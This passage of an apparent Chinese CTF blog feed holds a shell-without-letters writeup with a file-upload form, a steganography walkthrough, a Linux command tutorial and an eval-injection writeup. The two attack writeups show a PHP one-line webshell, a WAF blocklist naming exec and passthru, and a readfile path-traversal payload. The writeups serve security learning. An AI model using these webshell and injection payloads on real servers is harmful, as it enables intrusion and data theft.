class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://47.98.234.232:*****/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span>   </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>提交一个1.txt的文件，这个文件会被保存在这个<code>/tmp/phpXXXXXX</code>临时文件夹下，我们执行这个临时文件夹就是执行1.txt文件里面的内容。</p><p>我们在把1.txt中写入<code>ls</code>，并把执行完<code>1.txt</code>文件返回的内容（即执行ls返回的内容）保存在<code>var/www/html</code>目录下的abc文件中</p><p><code>var/www/html</code>是Apache的默认路径</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/17.png" alt="19"></p><p>接着在ip地址后添加<code>/abc</code>，可以看到成功返回执行1.txt后的内容。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/18.png" alt="18"></p><p>直接<code>cat flag</code></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/19.png" alt="22"></p><p>我们还可以上传一个小马文件<code>get flag</code></p><p>例如我们创建一个hello.php的文件，文件内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php eval(\$_POST[&#39;shell&#39;]);&quot; </span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/20.png" alt="4"></p><p>然后<code>cat flag</code></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/21.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;作为CTF中，虽然有很多文章有这方面的资料，但是相对来说比较零散，这里主要把自己学习和打ctf遇到的一些绕过字符数字构造shell梳理一下。</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>杂项</title>
    <link href="http://www.yoyo2tong.xyz/2020/12/21/%E5%86%85%E9%83%A8%E6%96%87%E4%BB%B6%EF%BC%8C%E6%9D%82%E9%A1%B9%E7%BB%BC%E5%90%88/"/>
    <id>http://www.yoyo2tong.xyz/2020/12/21/%E5%86%85%E9%83%A8%E6%96%87%E4%BB%B6%EF%BC%8C%E6%9D%82%E9%A1%B9%E7%BB%BC%E5%90%88/</id>
    <published>2020-12-21T09:09:24.437Z</published>
    <updated>2020-12-21T09:54:14.913Z</updated>
    
    <content type="html"><![CDATA[<h3 id="图片中的密码"><a href="#图片中的密码" class="headerlink" title="图片中的密码"></a>图片中的密码</h3><p>打开图片发现jpg文件尾和rar文件头，截取rar文件</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%9D%82%E9%A1%B9/bw-%E5%8A%A0%E8%A7%A3%E5%AF%86-%E5%9B%BE%E7%89%87%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81/1.png" alt="1"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%9D%82%E9%A1%B9/bw-%E5%8A%A0%E8%A7%A3%E5%AF%86-%E5%9B%BE%E7%89%87%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81/2.png" alt="2"></p><p>生成的rar文件解压得到一个txt文件</p><p>请将”TWpBeE5ERXdNVFE9”用Base64两次解密后得到密码。</p><p>把图片拖进虚拟机binwalk也可以得到txt文件。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%9D%82%E9%A1%B9/bw-%E5%8A%A0%E8%A7%A3%E5%AF%86-%E5%9B%BE%E7%89%87%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81/3.png" alt="3"></p><h3 id="paint-zip"><a href="#paint-zip" class="headerlink" title="paint.zip"></a>paint.zip</h3><p>解压文件得到一个txt文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(10,10)</span><br><span class="line">(11,10)</span><br><span class="line">(12,10)</span><br><span class="line">(13,10)</span><br><span class="line">(14,10)</span><br><span class="line">(15,10)</span><br><span class="line">(16,10)</span><br></pre></td></tr></table></figure><p>猜测每一个点对应的是一个坐标，需要把括号去掉，然后用gunplot得到二维码</p><p>把文件拖进010，用replace功能，把（）替换为空</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%9D%82%E9%A1%B9/bw-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-paint/1.png" alt="1"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">10,10 </span><br><span class="line">11,10 </span><br><span class="line">12,10                        </span><br><span class="line">13,10 </span><br><span class="line">14,10 </span><br><span class="line">15,10 </span><br><span class="line">16,10 </span><br><span class="line">17,10 </span><br><span class="line">18,10 </span><br><span class="line">19,10 </span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%9D%82%E9%A1%B9/bw-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-paint/2.png" alt="2"></p><p>扫描二维码就可以得到flag</p><h3 id="教练我想打ctf"><a href="#教练我想打ctf" class="headerlink" title="教练我想打ctf"></a>教练我想打ctf</h3><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%9D%82%E9%A1%B9/bw-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-%E6%95%99%E7%BB%83%E6%88%91%E6%83%B3%E6%89%93ctf/2.png"></p><p>把图片拖进kali中binalk发现zip隐藏文件，zsteg可以检测PNG和BMP图片里的隐写数据。</p><p>用命令将图片中的zip压缩包提取出来并命名为1.zip，解压1.zip可以得到一个1的文件</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%9D%82%E9%A1%B9/bw-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-%E6%95%99%E7%BB%83%E6%88%91%E6%83%B3%E6%89%93ctf/5.png"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%9D%82%E9%A1%B9/bw-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-%E6%95%99%E7%BB%83%E6%88%91%E6%83%B3%E6%89%93ctf/4.png"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%9D%82%E9%A1%B9/bw-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-%E6%95%99%E7%BB%83%E6%88%91%E6%83%B3%E6%89%93ctf/3.png"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%9D%82%E9%A1%B9/bw-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-%E6%95%99%E7%BB%83%E6%88%91%E6%83%B3%E6%89%93ctf/6.png"></p><h3 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h3><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%9D%82%E9%A1%B9/bw-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-%E4%B9%9D%E8%BF%9E%E7%8E%AF/111.png" alt="111"></p><p>这个4C68zip文件包含一张加密的图片，还有一个qwe.zip文件。qwe.zip文件里面有一个加密的flag.txt</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%9D%82%E9%A1%B9/bw-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-%E4%B9%9D%E8%BF%9E%E7%8E%AF/112.png" alt="112"></p><p>本来以为4C68zip是一个伪加密文件，但发现并没有修改压缩文件的标志位，分离该zip图片，zip的文件头50 4B 03 04，结尾块标识50 4B 05 06，得到一张图片和一个压缩包，压缩包需要密码。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%9D%82%E9%A1%B9/bw-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-%E4%B9%9D%E8%BF%9E%E7%8E%AF/115.png"></p><p>这里不是伪加密，介绍一下图片隐写工具Steghide</p><p>Steghide是一个可以将文件隐藏到图片或音频中的工具</p><p><strong>安装</strong>   apt-get install steghide</p><p><strong>隐藏文件</strong>    steghide embed -cf [图片文件载体] -ef [待隐藏文件]<br><strong>例</strong>：steghide embed -cf 1.jpg -ef 1.txt</p><p>从text.jpg接出secret.txt</p><p>steghide extract -sf test.jpg -p 123456</p><p><strong>查看图片中嵌入的文件信息</strong><br>steghide info 1.jpg</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%9D%82%E9%A1%B9/bw-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-%E4%B9%9D%E8%BF%9E%E7%8E%AF/2.png" alt="2"></p><p>ko.txt文件的内容就是flag.txt文件的密码。</p><h3 id="学姐真美"><a href="#学姐真美" class="headerlink" title="学姐真美"></a>学姐真美</h3><p>解压得一张图片，拖进kali，用binwak，foremost都没有发现线索，用stegsolve发现图片可能存在二维码，但是在stegsolve中不能得到二维码，用steghide也不能发现隐藏文件，把图片拖进010分析，是jpg的文件头。由于猜测存在二维码图片，搜索jpg文件头，png文件头等，没有找到匹配值。在网上找资料显示这道题确实含有png文件，找一下png文件的文件标识</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%9D%82%E9%A1%B9/bw-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-%E5%AD%A6%E5%A7%90%E7%9C%9F%E7%BE%8E/1.png" alt="1"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%9D%82%E9%A1%B9/bw-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-%E5%AD%A6%E5%A7%90%E7%9C%9F%E7%BE%8E/2.png" alt="2"></p><p>发现包含一张被修改png文件头的png文件，修改文件头并分离图片，得到一张不完全的二维码图片</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%9D%82%E9%A1%B9/bw-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-%E5%AD%A6%E5%A7%90%E7%9C%9F%E7%BE%8E/11.png"></p><p>修改图片高度后扫描二维码即可得到flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;图片中的密码&quot;&gt;&lt;a href=&quot;#图片中的密码&quot; class=&quot;headerlink&quot; title=&quot;图片中的密码&quot;&gt;&lt;/a&gt;图片中的密码&lt;/h3&gt;&lt;p&gt;打开图片发现jpg文件尾和rar文件头，截取rar文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://z</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>关于linux的一些知识点</title>
    <link href="http://www.yoyo2tong.xyz/2020/11/29/linux%E7%B3%BB%E7%BB%9F/"/>
    <id>http://www.yoyo2tong.xyz/2020/11/29/linux%E7%B3%BB%E7%BB%9F/</id>
    <published>2020-11-29T04:51:41.070Z</published>
    <updated>2021-03-21T08:10:02.207Z</updated>
    
    <content type="html"><![CDATA[<h3 id="linux系统"><a href="#linux系统" class="headerlink" title="linux系统"></a>linux系统</h3><table><thead><tr><th>RedHat系列</th><th>Deblian系列</th></tr></thead><tbody><tr><td>Redhat</td><td>Debian</td></tr><tr><td>Centos</td><td>Ubuntu</td></tr><tr><td>Fedora等</td><td>Kali Linux等</td></tr></tbody></table><h4 id="RedHat系列"><a href="#RedHat系列" class="headerlink" title="RedHat系列"></a>RedHat系列</h4><p>常见的安装包格式：</p><p>1，rpm包，安装rpm包的命令是“rpm -参数”</p><p>2，包管理工具yum</p><p>3，支持tar包</p><h4 id="Debian系列"><a href="#Debian系列" class="headerlink" title="Debian系列"></a>Debian系列</h4><p>1，deb包，安装deb包的命令是“dpkg -参数”</p><p>2，包管理工具 apt-get</p><p>3，支持tar包</p><h3 id="Ubuntu包管理方法apt-get"><a href="#Ubuntu包管理方法apt-get" class="headerlink" title="Ubuntu包管理方法apt-get"></a>Ubuntu包管理方法apt-get</h3><p>普通安装：apt-get  install softname1 softname2 …</p><p>修复安装： apt-get   -f   install softname1  softname2…</p><p>重新安装：apt-get -reinstall install softname1 softname2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">apt-cache search package  搜索包 </span><br><span class="line">apt-cache show package    获取包的相关信息，如说明、大小、版本等 </span><br><span class="line">sudo apt-get install package  安装包 </span><br><span class="line">sudo apt-get install package -- reinstall 重新安装包 </span><br><span class="line">sudo apt-get -f install     修复安装&quot;-f &#x3D; --fix-missing&quot; </span><br><span class="line"></span><br><span class="line">sudo apt-get remove package 删除包 </span><br><span class="line">sudo apt-get remove package -- purge 删除包，包括删除配置文件等 </span><br><span class="line">sudo apt-get update  更新源 </span><br><span class="line">sudo apt-get upgrade 更新已安装的包 </span><br><span class="line">sudo apt-get dist-upgrade 升级系统 </span><br><span class="line"></span><br><span class="line">sudo apt-get dselect-upgrade 使用 dselect 升级 </span><br><span class="line">apt-cache depends package 了解使用依赖 </span><br><span class="line">apt-cache rdepends package 是查看该包被哪些包依赖 </span><br><span class="line">sudo apt-get build-dep package 安装相关的编译环境 </span><br><span class="line">apt-get source package 下载该包的源代码 </span><br><span class="line"></span><br><span class="line">sudo apt-get clean &amp;&amp; sudo apt-get autoclean 清理无用的包 </span><br><span class="line">sudo apt-get check 检查是否有损坏的依赖</span><br></pre></td></tr></table></figure><h3 id="linux下源码安装软件方式"><a href="#linux下源码安装软件方式" class="headerlink" title="linux下源码安装软件方式"></a>linux下源码安装软件方式</h3><p>源码安装 （.tar  tar.gz   tar.bz2   tar.Z）</p><p>源码的安装一般由3个步骤组成 ：配置（configure），编译（make），安装（make install）</p><p>进入到解压出的目录中，依次执行</p><p>1，./configure</p><p>2, make</p><p>3, sudo make install</p><h3 id="linux下的压缩命令"><a href="#linux下的压缩命令" class="headerlink" title="linux下的压缩命令"></a>linux下的压缩命令</h3><p>在Linux中，常用的文件压缩工具有gzip,bzip2,zip。 bzip2是最理想的压缩工具，它提供了最大限度的压缩。</p><h4 id="bzip2-bunzip2命令"><a href="#bzip2-bunzip2命令" class="headerlink" title="bzip2/bunzip2命令"></a>bzip2/bunzip2命令</h4><p>是扩展名为bz2的压缩/解压缩工具</p><p>要使用bzip2来压缩文件，在shell提示下输入命令：bzip2  文件名  文件即会被压缩，并保存为文件名.bz2</p><p>要解压文件，输入命令bunzip2 文件名.bz2。</p><p>bzip2 filename.bz2 file1 file2 file3  /usr/work/school</p><p>上面的命令把file1，file2，file3以及/usr/work/school 目录中的内容压缩起来放入filename.bz2.</p><h4 id="gzip-gunzip命令"><a href="#gzip-gunzip命令" class="headerlink" title="gzip/gunzip命令"></a>gzip/gunzip命令</h4><p>是扩展名为gz的压缩/解压缩工具</p><p>要使用gzip来压缩文件，输入命令：gzip  文件名</p><p>要解压缩文件，输入命令：gunzip 文件名.gz</p><h4 id="zip-unzip命令"><a href="#zip-unzip命令" class="headerlink" title="zip/unzip命令"></a>zip/unzip命令</h4><p>是扩展名为zip的压缩/解压缩工具</p><p>zip命令的使用方法同gzip</p><h4 id="tar包"><a href="#tar包" class="headerlink" title="tar包"></a>tar包</h4><p>tar是linux等下的打包工具，生成的包通常也用tar作为扩展名。</p><p>例：xxx.tar.gz 表示这个tar包是压缩的，并且使用的压缩算法是GNU ZIP</p><p>​       xxx.tar.bz2就表示这个包使用了bzip2算法进行压缩</p><h4 id="Jar包"><a href="#Jar包" class="headerlink" title="Jar包"></a>Jar包</h4><p>即Java Archive，Java的包，java编译好之后生成class文件，可以把这些class文件打包成一个jar，jar中除了class文件还可以包括一些资源和配置文件，通常一个jar包就是一个java程序或者一个java库。</p><h3 id="npm介绍"><a href="#npm介绍" class="headerlink" title="npm介绍"></a>npm介绍</h3><p>npm是随同NodeJS一起安装的包管理工具，能解决NodeJS代码部署上的很多问题，常见的使用场景</p><p>1，允许用户从npm服务器下载别人编写的第三方包到本地使用</p><p>2，允许用户从npm服务器下载并安装别人编写的命令行程序到本地使用。</p><p>3，允许用户将自己编写的包或命令行程序上传到NPM服务器供别人使用。</p><p>Linux Ubuntu系统下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install npm</span><br></pre></td></tr></table></figure><h3 id="Linux管理文件和目录"><a href="#Linux管理文件和目录" class="headerlink" title="Linux管理文件和目录"></a>Linux管理文件和目录</h3><h4 id="pwd命令"><a href="#pwd命令" class="headerlink" title="pwd命令"></a>pwd命令</h4><p>print working directory(打印工作目录)，显示当前目录。</p><h4 id="cd命令"><a href="#cd命令" class="headerlink" title="cd命令"></a>cd命令</h4><table><thead><tr><th>cd</th><th>命令用来改变所在目录</th></tr></thead><tbody><tr><td>cd /</td><td>转到根目录中</td></tr><tr><td>cd~</td><td>转到/home/user用户目录下</td></tr><tr><td>cd /user</td><td>转到根目录下的user目录中 ———-绝对路径</td></tr><tr><td>cd  test</td><td>转到当前目录下的test子目录中——–相对路径</td></tr><tr><td>cd ..</td><td>返回上一级目录</td></tr></tbody></table><h4 id="cat命令"><a href="#cat命令" class="headerlink" title="cat命令"></a>cat命令</h4><p>cat命令可以用来合并文件，也可以用来在屏幕上显示整个文件，ctrl+D退出cat。</p><h4 id="grep命令"><a href="#grep命令" class="headerlink" title="grep命令"></a>grep命令</h4><p>grep命令的最大功能是在一堆文件中查找一个特定的字符串。</p><p>例： grep flag test.txt</p><p>grep查找是区分大小写的。</p><h4 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a>touch命令</h4><p>touch 命令用来创建新文件</p><p>touch 文件名</p><h4 id="mkdir命令"><a href="#mkdir命令" class="headerlink" title="mkdir命令"></a>mkdir命令</h4><p>mkdir命令用于创建新文件</p><p>mkdir  文件名</p><h4 id="mv命令"><a href="#mv命令" class="headerlink" title="mv命令"></a>mv命令</h4><p>mv命令用来移动文件</p><p>-i     互动：如果选择的文件将覆盖目标中的文件，他会提示确认</p><p>-f     强制：它会超越互动模块，不提示地移动文件</p><p>-v    详细：显示文件的移动进度</p><p>mv  t.txt  Document   把文件t.txt 移动到目录Document中。</p><h4 id="rm命令"><a href="#rm命令" class="headerlink" title="rm命令"></a>rm命令</h4><p>rm命令用来删除文件。</p><table><thead><tr><th align="left">-i</th><th>互动：提示确认删除</th></tr></thead><tbody><tr><td align="left">-f</td><td>强制：代替互动模块，不提示确认删除</td></tr><tr><td align="left">-v</td><td>详细：显示文件的删除进度</td></tr><tr><td align="left">-r</td><td>递归：将删除某个目录以及其中所以的文件和子文件</td></tr></tbody></table><h4 id="rmdir命令"><a href="#rmdir命令" class="headerlink" title="rmdir命令"></a>rmdir命令</h4><p>rmdir 命令用来删除目录</p><h4 id="tar包-1"><a href="#tar包-1" class="headerlink" title="tar包"></a>tar包</h4><p>tar是linux等下的打包工具，生成的包通常也用tar作为扩展名。</p><p>例：xxx.tar.gz 表示这个tar包是压缩的，并且使用的压缩算法是GNU ZIP</p><p>​       xxx.tar.bz2就表示这个包使用了bzip2算法进行压缩</p><h4 id="Jar包-1"><a href="#Jar包-1" class="headerlink" title="Jar包"></a>Jar包</h4><p>即Java Archive，Java的包，java编译好之后生成class文件，可以把这些class文件打包成一个jar，jar中除了class文件还可以包括一些资源和配置文件，通常一个jar包就是一个java程序或者一个java库。</p><h3 id="Linux的系统分区"><a href="#Linux的系统分区" class="headerlink" title="Linux的系统分区"></a>Linux的系统分区</h3><h4 id="磁盘分区"><a href="#磁盘分区" class="headerlink" title="磁盘分区"></a>磁盘分区</h4><p>磁盘分区是使用分区编辑器在磁盘上划分几个逻辑部分。碟片一旦划分成数个分区，不同类的目录与文件可以存储进不同的分区。</p><h4 id="扩展分区"><a href="#扩展分区" class="headerlink" title="扩展分区"></a>扩展分区</h4><p>1，最多只能有1个</p><p>2，主分区加扩展分区只能有4个</p><p>3，不能写入数据，只能包含逻辑分区</p><h4 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h4><p>（格式化的根本目的是写入文件系统），是指根据用户选定的文件系统，在磁盘的特定区域写入特定数据，在分区中划出一片用于存放文件分配表，目录表等用于文件管理的磁盘大小。</p><p><strong>格式化的目的：</strong></p><p>1，把我们的分区分成等大小的数据块</p><p>2，在分区列表中建立二维表格，记录文件的ID号，修改时间，权限。</p><p>Windows中的文件系统：FAT16，FAT32，NTFS</p><p>linux中的文件系统: EXT2，EXT3，EXT4</p><p>windows：分区—&gt;格式化—&gt;分配盘符</p><p>linux：分区—&gt;格式化—&gt;给每一个分区起一个设备文件名—&gt;挂载</p><p><strong>挂载（给分区分配“盘符”的过程）</strong></p><p>挂载点：可以看成是Windows下的盘符，在Linux中我们不是使用A，B，C…….作为盘符，而是用目录作为盘符，绝大部分目录都可以作为盘符。</p><p>必须分区      / (根分区)</p><p>swap分区（虚拟内存），一般不超过2GB</p><p>推荐分区      /boot (启动分区，200MB)  如果不分该区的话，默认存储在根目录下。</p><p><strong>目录（挂载点或者说盘符）进行了挂载，那么目录（挂载点）就拥有了一个分区。相当于Windows下盘符的一个盘。）</strong></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/linux/1.png" alt="2"></p><h4 id="有关磁盘空间的命令"><a href="#有关磁盘空间的命令" class="headerlink" title="有关磁盘空间的命令"></a>有关磁盘空间的命令</h4><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>mount</td><td>挂载文件系统</td></tr><tr><td>umount</td><td>卸载已挂载上的文件系统</td></tr><tr><td>df</td><td>检查各个硬盘分区和已挂上来的文件系统的磁盘空间</td></tr><tr><td>du</td><td>显示文件目录和大小</td></tr><tr><td>fsck</td><td>主要是检查和修复Linux文件系统</td></tr></tbody></table><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/u014472548/article/details/90768415?utm_source=app"> Linux 下yum，apt-get，wget详解及软件安装方式</a></p><p><a href="https://wenku.baidu.com/view/ffc4627981c758f5f61f67a1.html">最全Linux常用命令大全-linux常用命令全集</a></p><p><a href="https://blog.csdn.net/qq_15096707/article/details/73717702?utm_source=app"> Linux简介及系统安装_梦空间-CSDN博客_linux安装 </a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;linux系统&quot;&gt;&lt;a href=&quot;#linux系统&quot; class=&quot;headerlink&quot; title=&quot;linux系统&quot;&gt;&lt;/a&gt;linux系统&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;RedHat系列&lt;/th&gt;
&lt;th&gt;Deblian系列&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>简单的计算题（python脚本）</title>
    <link href="http://www.yoyo2tong.xyz/2020/11/10/%E7%AE%80%E5%8D%95%E8%AE%A1%E7%AE%97%E5%99%A8/"/>
    <id>http://www.yoyo2tong.xyz/2020/11/10/%E7%AE%80%E5%8D%95%E8%AE%A1%E7%AE%97%E5%99%A8/</id>
    <published>2020-11-10T07:51:27.370Z</published>
    <updated>2021-03-21T08:32:18.109Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">靶机：http:&#x2F;&#x2F;47.98.234.232:8000</span><br></pre></td></tr></table></figure><h3 id="第一种解法"><a href="#第一种解法" class="headerlink" title="第一种解法"></a>第一种解法</h3><p>对源码进行简化可得</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function waf($str)&#123;</span><br><span class="line">    if(preg_match(&quot;&#x2F;put|sys|exec|\&#96;|\^|\%|\~\&#x2F;|passthru|popen|cat|\\|preg|ph|\&lt;\?|\&lt;|ar|un|sc|va&#x2F;is&quot;, $str))&#123;</span><br><span class="line">        die(&quot;no hack&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;a&#39;]))&#123;  &#x2F;&#x2F;传入一个参数a，执行waf方法，对参数a进行过滤</span><br><span class="line">    waf($_GET[&#39;a&#39;]);</span><br><span class="line">    $payload &#x3D; preg_replace(&quot;&#x2F;;&#x2F;&quot;, &quot;&quot;, $_GET[&#39;a&#39;]);&#x2F;&#x2F;把;替换为空</span><br><span class="line">    echo $payload; </span><br><span class="line">    $go &#x3D; sprintf(&quot;\$check&#x3D;(%s&#x3D;&#x3D;%s);&quot;,100,$payload); &#x2F;&#x2F;把过滤后的值与100做比较，如果为真，则check不为0，输出U 4re right,如果为假，输出Try again!</span><br><span class="line">    echo $go;</span><br><span class="line">    eval($go);&#x2F;&#x2F;危险函数eval,利用该函数可以得到flag</span><br><span class="line">    if($check)&#123;</span><br><span class="line">        echo &quot;U 4re right&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo  &quot;Try again!&quot;;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再一次简化为关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> $go = sprintf(<span class="string">&quot;\$check=(%s==%s);&quot;</span>,<span class="number">100</span>,<span class="number">100</span>);</span><br><span class="line"><span class="keyword">eval</span> ($go);</span><br></pre></td></tr></table></figure><p>通过修改$go的值执行eval函数</p><p>首先执行phpinfo()</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/1.png"></p><p>可以看到，我们只要在$go 后面添加and+执行语句，eval就可以执行该命令。</p><p>但是此函数不可在题目上进行测试，因为题目过滤了php.</p><p>在php网站跟目录添加一个flag文件进行测试。</p><p>我们可以对该flag文件进行读取并输出</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/2.png"></p><p>可以看到成功输出文件内容。</p><p>但是，题目中过滤了va，所以不能使用var_dump这个函数。想到另一个输出函数print_r</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/3.png"></p><p>成功执行，在题目上进行测试。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/4.png"></p><p>提示在var/www/html/index.php上不存在flag文件，想到了返回上一级目录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and print_r(readfile(&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag&quot;))</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/5.png"></p><p><strong>在通过python脚本获取flag之前，我们需要对python脚本有一些了解。</strong></p><h3 id="Python-HTTP请求"><a href="#Python-HTTP请求" class="headerlink" 